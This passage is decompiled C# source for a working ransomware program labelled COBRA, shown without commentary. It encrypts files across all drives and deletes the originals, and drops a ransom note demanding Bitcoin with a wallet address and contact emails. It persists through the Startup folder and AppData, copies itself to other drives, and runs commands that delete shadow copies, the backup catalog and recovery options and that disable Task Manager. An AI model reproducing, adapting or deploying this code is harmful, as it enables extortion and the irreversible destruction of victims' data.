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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it_cobra.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	private static bool disableTaskManager = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"!!! Boom Bitch \ud83d\udca5: YOUR FILES ARE ENCRYPTED By .COBRA!!!", "", "Your network/computer has been infected and all your files has encrypted with military-grade encryption. by our ransomware and you won't be able to decrypt them without our help .", "To retrieve your data, send $1197026 in Bitcoin to the following address within 48 hours:", "", "14yGTDgzfsKrv6UhQnrVBDRJZtSuKNgiDP", "", "Failure to comply will result in the permanent deletion of your files and their sale on the dark web. This is not a bluff.", "Do not attempt to remove the ransomware or call the authorities. Any attempt to do so will lead to immediate destruction of your data.", "Act now if you value your business and your privacy.",
		"", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 18.301 BTC", "Bitcoin Address:  14yGTDgzfsKrv6UhQnrVBDRJZtSuKNgiDP", "",
		"contact me: (send Bulk mail)", "purchase@lnt-corp.com", "xwolf69@onionmail.org", "admin@lntdeal.com", "purchase@lntdeal.com", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					try
					{
						fileInfo.Attributes = FileAttributes.Normal;
					}
					catch
					{
					}
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						if (checkDirContains(files[i]))
						{
							string keyRSA = RSA_Encrypt(text, rsaKey());
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					new DirectoryInfo(directories[j]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>roZpYNeGLtBBaz+AMsgLr42YuM6CrD7bRGdW6mE+2PLHvihzG+5Ondu2N9NXS4oJZ4g5PKcK46DQZBvr5jD7L0SAt1FZIfNDTstMO1pw7P8ojTeBywBrSbgV/ENm9//QUV+MplvOayQO6fxuP9GfjuwCY/hpXP2psC/qcv7CMUY76XLYVV5z3DoaQJkhNQ8ZeHEfM5pa6TZvxCU5mQPQntZZNvYS9j0qgTWn4h3V/j0/twjeSYfrJCiguzOZ+sQwesFbDcwAVUKrVMPi7D1ke9wiOX8a6neVLpqLSAITiy6I4VTZZ9anN6ChR9YGIowH4yL1RVVp4kVRnet3YkJYYQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
